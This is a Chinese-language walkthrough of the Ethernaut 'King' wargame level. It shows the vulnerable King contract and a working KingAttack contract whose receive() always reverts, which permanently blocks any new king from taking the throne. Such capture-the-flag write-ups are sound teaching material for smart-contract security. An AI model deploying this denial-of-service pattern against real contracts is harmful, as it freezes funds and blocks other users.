# 9. King
### 原题

下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.

这么有趣的游戏, 你的目标是攻破他.

当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.

---
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
### 分析
这个感觉就是竞选国王啊，谁有钱谁就当，如果你价更高，我必须被迫接受下台。\
可是我很享受当国王的美好日子，想打破规则，想一直当下去。\
这时候我又要开始动起我的小心思了，试试能不能破解。\
就算你钱再多，系统也不会让我拱手相让。\
我们看看这个receive()函数，你要不就是所有者，要不就是你要出价比上一个国王的价格高，才可以得到。\
假设我从七大姑八大姨东拼西凑凑齐了足够的钱，那我就可以转账，然后得到我要的。\
上一个国王得到我的补贴，把皇位拱手相让。\
我要防止下一个，那怎么办，那就是我不接收转账呗。\
“payable(king).transfer(msg.value);”如果我在接受转账的过程中主动revert()，\
那就整个交易都是失败的，我还是原来的我！
来看看代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
   address public king;

    constructor(address _king) payable  {
      king = _king;

    }
    function attack(uint256 amount) public {
      require(address(this).balance >= amount, "Not enough");  
      (bool success,) = king.call{value: amount}("");
      require(success, "attack failed");
    }

    receive() external payable { 
      // 重点在这，主动报错,整个交易回滚，你还是原来的国王
      revert("I am King forever");
    }

}
```
### 总结
这个案例告诉我们，要学会拒绝：）